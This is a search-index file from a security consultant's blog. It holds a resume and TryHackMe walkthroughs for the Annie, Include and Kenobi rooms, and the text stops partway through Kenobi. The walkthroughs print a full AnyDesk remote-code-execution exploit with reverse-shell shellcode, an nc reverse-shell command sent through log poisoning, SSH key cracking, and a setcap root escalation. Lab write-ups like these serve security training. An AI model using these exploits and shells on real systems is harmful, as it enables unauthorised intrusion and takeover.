var __index = {"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"index.html","title":"Home","text":"<p>\ud83d\udea7 Under construction \ud83d\udea7</p>"},{"location":"about-me/index.html","title":"Hello!!","text":"<p>I'm Tom</p>"},{"location":"about-me/resume.html","title":"Resume","text":""},{"location":"about-me/resume.html#professional-summary","title":"Professional Summary","text":"<p>I've been working as a security consultant for about three years since I retired from the Army in 2022. I'm especially interested in internal and external network testing, as well as web application testing. </p>"},{"location":"about-me/resume.html#work-history","title":"Work History","text":""},{"location":"about-me/resume.html#senior-security-consultant","title":"Senior Security Consultant","text":"<p>TrustFoundry</p> <p>January 2024 - Present</p> <ul> <li>Pending</li> </ul>"},{"location":"about-me/resume.html#security-consultant","title":"Security Consultant","text":"<p>TrustFoundry</p> <p>June 2022 - January 2024</p> <ul> <li>Pending</li> </ul>"},{"location":"about-me/resume.html#education","title":"Education","text":"<p>M.S. Cybersecurity, Utica University, 2015</p>"},{"location":"about-me/resume.html#professional-certifications","title":"Professional Certifications","text":"<ul> <li>CISSP</li> <li>OSEP</li> <li>OSCP</li> <li>CRTO</li> <li>eWPT</li> </ul>"},{"location":"about-me/resume.html#publications","title":"Publications","text":"<ul> <li>TrustFoundry Blog: Fare Play: See the Movie for Free by Kerberoasting Service Tickets Through an AS-REPRoastable User</li> <li>Understanding Active Directory Certificate Services: A Focus on ESC1 and ESC8</li> </ul>"},{"location":"about-me/resume.html#talks-and-volunteer-work","title":"Talks and Volunteer Work","text":"<p>TBD</p>"},{"location":"blog/index.html","title":"Blog","text":""},{"location":"blog/2024/05/18/tryhackme-annie.html","title":"TryHackMe: Annie","text":"<p>Annie is a medium difficulty Linux box on TryHackMe. This machine involved compromising a vulnerable AnyDesk installation and then abusing an uncommon SetUID binary to elevate privileges to root. </p> <p></p>","tags":["anydesk","setuid"]},{"location":"blog/2024/05/18/tryhackme-annie.html#walkthrough","title":"Walkthrough","text":"","tags":["anydesk","setuid"]},{"location":"blog/2024/05/18/tryhackme-annie.html#enumeration","title":"Enumeration","text":"","tags":["anydesk","setuid"]},{"location":"blog/2024/05/18/tryhackme-annie.html#nmap","title":"Nmap","text":"<p>After exporting the hostname and IP to environment variables, I ran a basic nmap scan with default scripts and version detection against all ports. </p> <pre><code>$ sudo nmap -sC -sV -vv -p- -oA nmap/$name $ip\n</code></pre> <p>We can see that TCP ports 22 and 7070 are open. The higher numbered ports didn't turn out to be anything. </p> <pre><code>Nmap scan report for 10.10.58.196\nHost is up, received reset ttl 61 (0.22s latency).\nScanned at 2022-07-04 12:52:53 CDT for 1456s\nNot shown: 65531 closed ports\nReason: 65531 resets\nPORT      STATE SERVICE    REASON         VERSION\n22/tcp    open  ssh        syn-ack ttl 61 OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 72:d7:25:34:e8:07:b7:d9:6f:ba:d6:98:1a:a3:17:db (RSA)\n| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDA0R7eKVAIQzgsQ1QLoI7zzRYcaNBJ0wZtCbG1n5lR51Jfr2CC6+IVVxzleo0wCtfV9tcgtRXVdrju+29xaBR/Hin16MAf7QM4cY5dt46pgADnbwSXAy8GpnuCT10tTrL27gpKM2ayqmlpnKSxL2daP5uhkuoZCI3EYOvbaoPn4/u4vKeH64bk/s5zTE2JeIV/CwQnheYc1ZhwiJQD5k11735k+NfhD7pmhNY+QpG6qZNyFZ4APqdktrnDFetksOkC2NF4D8/OOjDsYkmofeIe+2fe01BHO4KFnRrKI3aSNDQdeNIQIL7LgKufgQ+yP0WmRLOThsiwu22jUG/8Ot1f\n|   256 72:10:26:ce:5c:53:08:4b:61:83:f8:7a:d1:9e:9b:86 (ECDSA)\n| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH+EwC6q+M+qEr2TTccTtvcNF7dfougjgrZzZG4ShpTnNo1KXJy6iTnW/al9mxm/ecZVSF45w3Z3IYwAi9nfrdU=\n|   256 d1:0e:6d:a8:4e:8e:20:ce:1f:00:32:c1:44:8d:fe:4e (ED25519)\n|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBgcqbntpdHoH14/wXi5gysaIvv0hOk+VvCUNmVjhkMQ\n7070/tcp  open  tcpwrapped syn-ack ttl 61\n42007/tcp open  tcpwrapped syn-ack ttl 61\n46467/tcp open  tcpwrapped syn-ack ttl 61\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n</code></pre> <p>After some research, I found that TCP port 7070 is commonly used with AnyDesk software. To test that theory, I checked online for exploits for AnyDesk and found one that looked promising. </p> <p></p> <p>I grabbed that exploit using <code>searchsploit</code>.</p> <pre><code>$ searchsploit -m 49613\n</code></pre>","tags":["anydesk","setuid"]},{"location":"blog/2024/05/18/tryhackme-annie.html#exploit","title":"Exploit","text":"","tags":["anydesk","setuid"]},{"location":"blog/2024/05/18/tryhackme-annie.html#updating-the-exploit-code","title":"Updating the exploit code","text":"<p>Reviewing the code, we can see there are a couple of things we need to update for it to work. </p> <pre><code># Exploit Title: AnyDesk 5.5.2 - Remote Code Execution\n# Date: 09/06/20\n# Exploit Author: scryh\n# Vendor Homepage: https://anydesk.com/en\n# Version: 5.5.2\n# Tested on: Linux\n# Walkthrough: https://devel0pment.de/?p=1881\n\n#!/usr/bin/env python\nimport struct\nimport socket\nimport sys\n\nip = '192.168.x.x'\nport = 50001\n\ndef gen_discover_packet(ad_id, os, hn, user, inf, func):\n  d  = chr(0x3e)+chr(0xd1)+chr(0x1)\n  d += struct.pack('&gt;I', ad_id)\n  d += struct.pack('&gt;I', 0)\n  d += chr(0x2)+chr(os)\n  d += struct.pack('&gt;I', len(hn)) + hn\n  d += struct.pack('&gt;I', len(user)) + user\n  d += struct.pack('&gt;I', 0)\n  d += struct.pack('&gt;I', len(inf)) + inf\n  d += chr(0)\n  d += struct.pack('&gt;I', len(func)) + func\n  d += chr(0x2)+chr(0xc3)+chr(0x51)\n  return d\n\n# msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.y.y LPORT=4444 -b \"\\x00\\x25\\x26\" -f python -v shellcode\nshellcode =  b\"\"\nshellcode += b\"\\x48\\x31\\xc9\\x48\\x81\\xe9\\xf6\\xff\\xff\\xff\\x48\"\nshellcode += b\"\\x8d\\x05\\xef\\xff\\xff\\xff\\x48\\xbb\\xcb\\x46\\x40\"\nshellcode += b\"\\x6c\\xed\\xa4\\xe0\\xfb\\x48\\x31\\x58\\x27\\x48\\x2d\"\nshellcode += b\"\\xf8\\xff\\xff\\xff\\xe2\\xf4\\xa1\\x6f\\x18\\xf5\\x87\"\nshellcode += b\"\\xa6\\xbf\\x91\\xca\\x18\\x4f\\x69\\xa5\\x33\\xa8\\x42\"\nshellcode += b\"\\xc9\\x46\\x41\\xd1\\x2d\\x0c\\x96\\xf8\\x9a\\x0e\\xc9\"\nshellcode += b\"\\x8a\\x87\\xb4\\xba\\x91\\xe1\\x1e\\x4f\\x69\\x87\\xa7\"\nshellcode += b\"\\xbe\\xb3\\x34\\x88\\x2a\\x4d\\xb5\\xab\\xe5\\x8e\\x3d\"\nshellcode += b\"\\x2c\\x7b\\x34\\x74\\xec\\x5b\\xd4\\xa9\\x2f\\x2e\\x43\"\nshellcode += b\"\\x9e\\xcc\\xe0\\xa8\\x83\\xcf\\xa7\\x3e\\xba\\xec\\x69\"\nshellcode += b\"\\x1d\\xc4\\x43\\x40\\x6c\\xed\\xa4\\xe0\\xfb\"\n\nprint('sending payload ...')\np = gen_discover_packet(4919, 1, '\\x85\\xfe%1$*1$x%18x%165$ln'+shellcode, '\\x85\\xfe%18472249x%93$ln', 'ad', 'main')\ns = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\ns.sendto(p, (ip, port))\ns.close()\nprint('reverse shell should connect within 5 seconds')\n</code></pre> <p>NOTE: This code runs with Python2. I'm sure there's a way to update the code to work with Python3, but I didn't try it.</p> <p>To make this code work, we need to update the following: - The 'ip' variable. This is the IP address of the THM machine. Leave the 'port' variable alone.  - The shellcode. You can run the provided command, substituting your own LHOST and LPORT values. </p> <p>After updating those values and running the exploit with <code>python2 49613.py</code> we get a connection back to our <code>netcat</code> listener. </p> <p></p>","tags":["anydesk","setuid"]},{"location":"blog/2024/05/18/tryhackme-annie.html#stabilize-the-shell","title":"Stabilize the shell","text":"<p>Stablize the reverse shell with the following commands <pre><code># Spawn a bash shell with Python\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n\n# Set the TERM environment variable\nexport TERM=xterm\n\n# Background the shell\nCtrl+z\n\n# Turn off echoing\nstty raw -echo;fg\n</code></pre></p> <p>NOTE: If you're using the ZSH shell, it's important to put <code>stty raw -echo;fg</code> all on one line. The shell seems to complain if you don't. </p> <p>Go ahead and grab the user flag. </p>","tags":["anydesk","setuid"]},{"location":"blog/2024/05/18/tryhackme-annie.html#ssh","title":"SSH","text":"<p>Checking around annie's home directory, we find an SSH key that will let us get a more stable shell. Copy that key onto your attacking machine and change permissions using </p> <pre><code>$ chmod 600 annie.key\n</code></pre> <p>As soon as we try to SSH into the machine as the <code>annie</code> user, we find that the key has a passphrase. </p> <p></p>","tags":["anydesk","setuid"]},{"location":"blog/2024/05/18/tryhackme-annie.html#cracking-the-passphrase","title":"Cracking the passphrase","text":"<p>To crack the passphrase for Annie's key, we need to use <code>ssh2john</code>. Depending on how you have <code>John the Ripper</code> installed, your installation location may be different, but you can find it with <code>locate ssh2john</code>. </p>","tags":["anydesk","setuid"]},{"location":"blog/2024/05/18/tryhackme-annie.html#get-a-john-compatible-hash","title":"Get a John-compatible hash","text":"<p>In order to use <code>john</code> to get the passphrase, we need to get it into a compatible hash format. We can do that with <code>ssh2john</code>. </p> <pre><code>$ ssh2john.py annie.key &gt; annie.hash\n</code></pre> <p>Once we have a compatible hash, we can use <code>john</code> to crack the passphrase. </p> <pre><code>$ john --wordlist=/opt/wordlists/rockyou.txt annie.hash\n</code></pre> <p>After a few minutes, the hash will crack and you'll have the passphrase. </p> <p>Awesome! We can get a stable SSH connection now and won't have to worry about a reverse shell dropping. </p>","tags":["anydesk","setuid"]},{"location":"blog/2024/05/18/tryhackme-annie.html#privilege-escalation","title":"Privilege Escalation","text":"","tags":["anydesk","setuid"]},{"location":"blog/2024/05/18/tryhackme-annie.html#enumeration_1","title":"Enumeration","text":"<p>From here, you're free to use whatever privilege escalation enumeration script you like (i.e., LinEnum, LinPEAS, Linux-Smart-Enumeration). Personally, I prefer LSE. If you don't like any of those, feel free to enumerate manually. </p>","tags":["anydesk","setuid"]},{"location":"blog/2024/05/18/tryhackme-annie.html#uncommon-setuid-binary","title":"Uncommon SetUID binary","text":"<p>Looking through the output of LSE, there's an uncommon binary with the setuid bit set. </p> <p></p>","tags":["anydesk","setuid"]},{"location":"blog/2024/05/18/tryhackme-annie.html#setcap","title":"Setcap","text":"<p>The <code>setcap</code> binary allows the user to set file capabilities. To exploit this, we can make a copy of the <code>python3</code> binary and modify the capabilities of that file as detailed here. </p>","tags":["anydesk","setuid"]},{"location":"blog/2024/05/18/tryhackme-annie.html#copy-the-python-binary","title":"Copy the Python binary","text":"<p>First, make a copy of the <code>python3</code> binary in the annie home directory. </p> <pre><code>$ cp /usr/bin/python3 /home/annie/python3\n</code></pre>","tags":["anydesk","setuid"]},{"location":"blog/2024/05/18/tryhackme-annie.html#set-the-cap_setuidep-capability","title":"Set the <code>cap_setuid+ep</code> capability","text":"<p>To escalate privileges, we're going to add the <code>cap_setuid+ep</code> capability to the local copy of the <code>python3</code> binary. This will allow us to set the effective user id of the created process (i.e., 0 for root). </p> <pre><code>$ setcap cap_setuid+ep /home/annie/python3\n</code></pre>","tags":["anydesk","setuid"]},{"location":"blog/2024/05/18/tryhackme-annie.html#spawn-a-new-process-as-root","title":"Spawn a new process as root","text":"<p>Now that we've set the capability on the local python binary, we can run the following command to escalate to root.</p> <pre><code>$ ./python3 -c 'import os;os.setuid(0);os.system(\"/bin/bash\")'\n</code></pre> <p></p> <p>Now you grab the root flag and finsh the room. </p>","tags":["anydesk","setuid"]},{"location":"blog/2024/06/07/tryhackme-include.html","title":"TryHackMe: Include","text":"<p>Include is a MEDIUM difficulty room on TryHackMe that involves abusing a logic flaw to get access to an admin panel, leveraging an internal API to obtain credentials for another service via a Server-Side Request Forgery (SSRF), and then combining a Local File Inclusion (LFI) vulnerability with log poisoning to achieve Remote Code Execution (RCE) on the web server. It should be noted that a subscription to TryHackMe is required to play this room. </p> <p> </p>","tags":["LFI","log_poisoning","SSRF"]},{"location":"blog/2024/06/07/tryhackme-include.html#walkthrough","title":"Walkthrough","text":"","tags":["LFI","log_poisoning","SSRF"]},{"location":"blog/2024/06/07/tryhackme-include.html#enumeration","title":"Enumeration","text":"","tags":["LFI","log_poisoning","SSRF"]},{"location":"blog/2024/06/07/tryhackme-include.html#port-scanning","title":"Port Scanning","text":"<p>The initial Nmap scan shows 8 ports open, as follows:</p> <pre><code>22/open/tcp/ssh/OpenSSH8.2p1Ubuntu4ubuntu0.11(UbuntuLinux;protocol2.0)\n25/open/tcp/smtp/Postfixsmtpd\n110/open/tcp/pop3/Dovecotpop3d\n143/open/tcp/imap/Dovecotimapd(Ubuntu)\n993/open/tcp/ssl|imap/Dovecotimapd(Ubuntu)\n995/open/tcp/ssl|pop3/Dovecotpop3d\n4000/open/tcp/http/Node.js(Expressmiddleware)\n50000/open/tcp/http/Apachehttpd2.4.41((Ubuntu))\n</code></pre>","tags":["LFI","log_poisoning","SSRF"]},{"location":"blog/2024/06/07/tryhackme-include.html#service-enumeration","title":"Service Enumeration","text":"","tags":["LFI","log_poisoning","SSRF"]},{"location":"blog/2024/06/07/tryhackme-include.html#ssh","title":"SSH","text":"<p>This isn't an ancient version of SSH, so it's unlikely that we'll find an exploitable condition in SSH itself, but it's worth checking to see if the service accepts password authentication and/or if a weak password might be in use. </p> <p>Password authentication is supported, however the initial check for weak passwords failed. </p> <pre><code>$ ssh root@$ip\n\nThe authenticity of host '10.10.172.107 (10.10.172.107)' can't be established.\nED25519 key fingerprint is SHA256:uURSOQLABB+Das+Emk8jQtlj9stf8TDyVdiz6DZmjoU.\nThis key is not known by any other names.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '10.10.172.107' (ED25519) to the list of known hosts.\nroot@10.10.172.107's password:\nPermission denied, please try again.\nroot@10.10.172.107's password:\nPermission denied, please try again.\nroot@10.10.172.107's password:\nroot@10.10.172.107: Permission denied (publickey,password).\n</code></pre> <p>We can move on from SSH for now.</p>","tags":["LFI","log_poisoning","SSRF"]},{"location":"blog/2024/06/07/tryhackme-include.html#smtp","title":"SMTP","text":"<p>Using <code>telnet</code> to connect to the SMTP service, we're able to enumerate valid users on the system, as shown below. Note the message after attempting to send mail to a user that does not exist (\"doesnotexist\") compared to the message received after entering a user that does exist (\"root\").</p> <pre><code>$ telnet $ip 25\n\nTrying 10.10.172.107...\nConnected to 10.10.172.107.\nEscape character is '^]'.\n220 mail.filepath.lab ESMTP Postfix (Ubuntu)\nHELO x\n250 mail.filepath.lab\nMAIL FROM: attacker@example.com\n250 2.1.0 Ok\nRCPT TO: doesnotexist\n550 5.1.1 &lt;doesnotexist&gt;: Recipient address rejected: User unknown in local recipient table\nRCPT TO: root\n250 2.1.5 Ok\n</code></pre> <p>We can use a tool like <code>smtp-user-enum</code> to try to gather a list of valid usernames. I ran this using the <code>john.txt</code> wordlist from statistically-likely-usernames. As shown below, the we've found two usernames: <code>joshua</code> and <code>charles</code>.</p> <p></p> <p>Let's hold onto this for now and come back to it later. </p>","tags":["LFI","log_poisoning","SSRF"]},{"location":"blog/2024/06/07/tryhackme-include.html#imappop3","title":"IMAP/POP3","text":"<p>We can grab the IMAP banner with netcat.</p> <pre><code>$ nc -nv $ip 143\n\nConnection to 10.10.102.86 143 port [tcp/*] succeeded!\n* OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ STARTTLS LOGINDISABLED] Dovecot (Ubuntu) ready.\n</code></pre> <p>Trying to log in, we get an error that plaintext authentication is not authorized over the unencrypted channel (good!). </p> <pre><code>A1 LOGIN th0m12 th0m12\n* BAD [ALERT] Plaintext authentication not allowed without SSL/TLS, but your client did it anyway. If anyone was listening, the password was exposed.\nA1 NO [PRIVACYREQUIRED] Plaintext authentication disallowed on non-secure (SSL/TLS) connections.\n</code></pre> <p>Connecting with openssl allows entering credentials, but since we don't have creds there's not much we can access. If nothing pans out with the other services, we might circle back to this to try brute forcing the credentials using the two usernames we've already enumerated. </p> <pre><code>$ openssl s_client -connect $ip:993 -quiet\n\nCan't use SSL_get_servername\ndepth=0 CN = ip-10-10-31-82.eu-west-1.compute.internal\nverify error:num=18:self-signed certificate\nverify return:1\ndepth=0 CN = ip-10-10-31-82.eu-west-1.compute.internal\nverify return:1\n* OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN AUTH=LOGIN] Dovecot (Ubuntu) ready.\nA1 LOGIN th0m12 password\nA1 NO [AUTHENTICATIONFAILED] Authentication failed.\nA1 LIST \"\" *\nA1 BAD Error in IMAP command received by server.\nA1 SELECT Inbox\nA1 BAD Error in IMAP command received by server.\n</code></pre> <p>Similarly, I didn't get anything from the POP3 service running on the server either.</p> <pre><code>$ openssl s_client -connect $ip:995 -crlf -quiet\n\nCan't use SSL_get_servername\ndepth=0 CN = ip-10-10-31-82.eu-west-1.compute.internal\nverify error:num=18:self-signed certificate\nverify return:1\ndepth=0 CN = ip-10-10-31-82.eu-west-1.compute.internal\nverify return:1\n+OK Dovecot (Ubuntu) ready.\nuser th0m12\n+OK\npass Password1!\n-ERR [AUTH] Authentication failed.\nLIST\n-ERR Unknown command.\nRETR 1\n-ERR Unknown command.\n</code></pre>","tags":["LFI","log_poisoning","SSRF"]},{"location":"blog/2024/06/07/tryhackme-include.html#exploitation","title":"Exploitation","text":"","tags":["LFI","log_poisoning","SSRF"]},{"location":"blog/2024/06/07/tryhackme-include.html#web","title":"Web","text":"","tags":["LFI","log_poisoning","SSRF"]},{"location":"blog/2024/06/07/tryhackme-include.html#http-port-4000","title":"HTTP - Port 4000","text":"<p>After adding the IP to the <code>/etc/hosts</code> file with the command below we're able to browse to the first web app:</p> <pre><code>$ echo -n '10.10.188.130\\tinclude.thm' | sudo tee -a /etc/hosts\n</code></pre> <p></p> <p>After logging in with <code>guest:guest</code> we're greeted with a \"Review App\". </p> <p></p> <p>Looking at the \"guest\" profile, there are a number of different attributes, and it looks like we can recommend activities for the user.</p> <p></p> <p>Under the \"Recommend an Activity to guest\" heading, it's possible to add a new activity type and name. To start, I entered <code>test:test</code>. As shown below, this gets added as a new attribute. </p> <p></p> <p>The attribute that sticks out the most is that <code>isAdmin: false</code>. It might be possible to overwrite the <code>isAdmin</code> value to give ourselves admin privileges.</p> <p>After entering <code>isAdmin:true</code> in the recommend an activity section, we can see that our user is now an admin and we have access to some new menu options. </p> <p></p> <p>Selecting the \"API\" option from the navigation bar brings up some API documentation listing endpoints on the localhost. </p> <p></p> <p>On the settings page, there's an option to update the profile banner. </p> <p></p> <p>This accepts a URL as input. It might be possible to use this to reach those API endpoints. </p> <p></p> <p>When we enter that and hit \"Update Banner Image\", we get back the following response:</p> <p></p> <p>Looks like a base64-encoded string.</p> <pre><code>$ echo 'eyJSZXZpZXdBcHBVc2VybmFtZS[...SNIP...]N0cmF0b3IiLCJTeXNNb25BcHBQYXNzd29yZCI6IlMkOSRxazZkIyoqTFFVIn0=' | base64 -d | jq\n\n{\n  \"ReviewAppUsername\": \"admin\",\n  \"ReviewAppPassword\": \"[REDACTED]\",\n  \"SysMonAppUsername\": \"administrator\",\n  \"SysMonAppPassword\": \"[REDACTED]\"\n}\n</code></pre>","tags":["LFI","log_poisoning","SSRF"]},{"location":"blog/2024/06/07/tryhackme-include.html#http-port-50000","title":"HTTP - Port 50000","text":"<p>Sweet. We've got a password that will allow us to log into the other web app on port 50000. </p> <p></p> <p>After using those credentials to log in, we land on a dashboard that contains the first flag.</p> <p></p> <p>Notice in the source code for <code>dashboard.php</code>, the profile picture is sourced from <code>profile.php</code> using an <code>img</code> parameter. </p> <p></p> <p>In fact, we can see this request in Burp Suite.</p> <p></p> <p>My first thought with this is testing for path traversal. Since I'm on Burp community edition with a significantly throttled intruder, I'm going to use <code>ffuf</code> for testing this quickly. Zapproxy, Caido, or other fuzzing tools will also probably work.</p> <p>To make this work with <code>ffuf</code> I saved the request to a file and then replaced \"profile.png\" with \"FUZZ\", as shown below:</p> <p></p> <p>Having configured the request file, we can run <code>ffuf</code> against it. </p> <pre><code>$ ffuf -r -c -request req.txt -request-proto 'http' -w /opt/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt -fs 0\n\n\n        /'___\\  /'___\\           /'___\\\n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/\n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\\n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/\n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\\n          \\/_/    \\/_/   \\/___/    \\/_/\n\n       v2.1.0-dev\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://include.thm:50000/profile.php?img=FUZZ\n :: Wordlist         : FUZZ: /opt/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt\n :: Header           : Cookie: PHPSESSID=gbvb62jo9gnq3vbbknsie463i7\n :: Header           : X-PwnFox-Color: orange\n :: Header           : Host: include.thm:50000\n :: Header           : User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0\n :: Header           : Accept: image/avif,image/webp,*/*\n :: Header           : Accept-Language: en-US,en;q=0.5\n :: Header           : Accept-Encoding: gzip, deflate, br\n :: Header           : Connection: keep-alive\n :: Header           : Referer: http://include.thm:50000/dashboard.php\n :: Header           : Priority: u=4\n :: Follow redirects : true\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500\n :: Filter           : Response size: 0\n________________________________________________\n\n....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2231, Words: 20, Lines: 42, Duration: 191ms]\n....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2231, Words: 20, Lines: 42, Duration: 188ms]\n[...SNIP...]\n</code></pre> <p>After fuzzing we find some path traversal sequences that work. Testing one of those in Burp, we find that it does in fact work to grab the <code>/etc/passwd</code> file. </p> <p></p> <p>From here, we need to find a way to get RCE. Since we have an LFI vulnerability, as well as a couple services exposed on the server, my thought is log poisoning. </p> <p>After some poking around, I found at least two that will probably work: <code>/var/log/auth.log</code> and <code>/var/log/mail.log</code>. </p> <p>Looking at <code>auth.log</code>:</p> <pre><code>HTTP/1.1 200 OK\nDate: Fri, 07 Jun 2024 13:13:51 GMT\nServer: Apache/2.4.41 (Ubuntu)\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\nCache-Control: no-store, no-cache, must-revalidate\nPragma: no-cache\nVary: Accept-Encoding\nContent-Length: 719\nKeep-Alive: timeout=5, max=100\nConnection: Keep-Alive\nContent-Type: text/html; charset=UTF-8\n\n\nJun  7 12:30:59 mail sshd[1853]: Server listening on 0.0.0.0 port 22.\nJun  7 12:30:59 mail sshd[1853]: Server listening on :: port 22.\nJun  7 12:34:35 mail auth: pam_unix(dovecot:auth): check pass; user unknown\nJun  7 12:34:35 mail auth: pam_unix(dovecot:auth): authentication failure; logname= uid=0 euid=0 tty=dovecot ruser=th0m12 rhost=10.2.113.252 \nJun  7 12:39:01 mail CRON[2009]: pam_unix(cron:session): session opened for user root by (uid=0)\nJun  7 12:39:01 mail CRON[2009]: pam_unix(cron:session): session closed for user root\nJun  7 13:09:01 mail CRON[2220]: pam_unix(cron:session): session opened for user root by (uid=0)\nJun  7 13:09:01 mail CRON[2220]: pam_unix(cron:session): session closed for user root\n</code></pre> <p>After attempting to SSH into the server, we can check the log again to see if the new entry is there. </p> <p></p> <p>Perfect. Let's see if we can inject a PHP web shell here. </p> <p></p> <p>Trying to use the standard SSH syntax doesn't work. However, it's possible to still poison the log using <code>NetExec</code> or <code>hydra</code>. Here, I used <code>NetExec</code>. </p> <p></p> <p>After checking the log again along with the <code>id</code> command, we can see that we've got command execution. </p> <p></p> <p>From here, you can either list the contents of the <code>/var/www/html/</code> directory from Burp repeater, or you can try to get a reverse shell and browse around a bit easier. The first time I did this room, I did it entirely in Burp, but for the purpose of this writeup, I'll test the reverse shell method.</p> <p>Using the following URL-encoded command I was able to get a reverse shell. I used revshells.com to generate this.</p> <pre><code>rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%2010.2.113.252%209001%20%3E%2Ftmp%2Ff\n</code></pre> <pre><code>GET /profile.php?img=....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//var/log/auth.log&amp;cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%2010.2.113.252%209001%20%3E%2Ftmp%2Ff HTTP/1.1\nHost: include.thm:50000\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0\nAccept: image/avif,image/webp,*/*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nConnection: keep-alive\nReferer: http://include.thm:50000/dashboard.php\nCookie: PHPSESSID=gbvb62jo9gnq3vbbknsie463i7\nX-PwnFox-Color: orange\nPriority: u=4\n</code></pre> <p></p> <p>Here is the \"mystery\" text file that will give us flag 2.</p> <p></p>","tags":["LFI","log_poisoning","SSRF"]},{"location":"blog/2024/06/07/tryhackme-include.html#additional-digging","title":"Additional Digging","text":"<p>Looking at the code for <code>profile.php</code>, we can see what's happening here.</p> <pre><code>&lt;?php\nsession_start();\n\nif (!isset($_SESSION['username'])) {\n    header('Location: login.php');\n    exit();\n}\n\nif(!empty($_GET['img'])){\n    $file = $_GET['img'];\n    $file = str_replace('../', '', $file);\n\n    $file = preg_replace('/\\.\\.\\//', '', $file, 5);\n    $filePath = 'uploads/' . $file;\n\n    if (strpos($filePath, 'uploads/') === 0) {\n        @include($filePath);\n    }\n} else {\n    echo \"No data received.\";\n}\n?&gt;\n</code></pre> <p>So the code is stripping out <code>../</code> sequences, but it's using the <code>preg_replace</code> function to strip out the first five occurrences of <code>../</code>. </p> <p>One potential option to prevent the path traversal might be to use the <code>realpath</code> PHP function which returns the canonicalized absolute path. I am not a PHP developer though, so if there are better solutions to prevent this, I'd love to hear about them. </p>","tags":["LFI","log_poisoning","SSRF"]},{"location":"blog/2024/06/07/tryhackme-include.html#resources","title":"Resources","text":"<p>preg-replace </p> <p>strpos</p> <p>realpath</p>","tags":["LFI","log_poisoning","SSRF"]},{"location":"blog/2024/06/07/tryhackme-kenobi.html","title":"TryHackMe: Kenobi","text":"<p>Kenobi is an EASY room on TryHackMe that involves accessing an open Samba share, and then abusing a vulnerable version of ProFtpd to get a foothold on the machine, and then abusing a SUID binary to elevate privileges to root. </p> <p>Please NOTE: The commands in this writeup vary slightly from the room walkthrough on THM. It's mostly down to personal preference, but with pentesting there are usually multiple ways to do something.</p> <p></p>","tags":["samba","ProFtpd","path-variable-manipulation"]},{"location":"blog/2024/06/07/tryhackme-kenobi.html#walkthrough","title":"Walkthrough","text":"","tags":["samba","ProFtpd","path-variable-manipulation"]},{"location":"blog/2024/06/07/tryhackme-kenobi.html#nmap-scan","title":"Nmap Scan","text":"<p>The initial nmap scan shows that there are five ports open, as shown below:</p> <pre><code>21/open/tcp/ftp/ProFTPD1.3.5\n22/open/tcp/ssh/OpenSSH7.2p2Ubuntu4ubuntu2.7(UbuntuLinux;protocol2.0)\n80/open/tcp/http/Apachehttpd2.4.18((Ubuntu))\n111/open/tcp/rpcbind/2-4(RPC#100000)\n139/open/tcp/netbios-ssn/Sambasmbd3.X-4.X(workgroup\n</code></pre>","tags":["samba","ProFtpd","path-variable-manipulation"]},{"location":"blog/2024/06/07/tryhackme-kenobi.html#service-footprinting","title":"Service Footprinting","text":"","tags":["samba","ProFtpd","path-variable-manipulation"]},{"location":"blog/2024/06/07/tryhackme-kenobi.html#ftp-port-21","title":"FTP - Port 21","text":"<p>Checking for anonymous access, it seems like anonymous access is allowed, but it's prompting for a full email as a password. Trying easy things like \"anonymous\", \"anonymous{at}kenobi.thm\", and a blank password didn't work. </p> <pre><code>$ ftp $ip 21\n\nConnected to 10.10.68.225.\n220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.68.225]\nName (10.10.68.225:thomas): anonymous\n331 Anonymous login ok, send your complete email address as your password\nPassword:\n530 Login incorrect.\nftp: Login failed\nftp&gt; exit\n221 Goodbye.\n</code></pre> <p>A later question will ask for the version number of ProFtpd running. It's in the output above, but we can also use <code>netcat</code> to grab the banner.</p> <pre><code>$ nc -nv $ip 21\n\nConnection to 10.10.68.225 21 port [tcp/*] succeeded!\n220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) 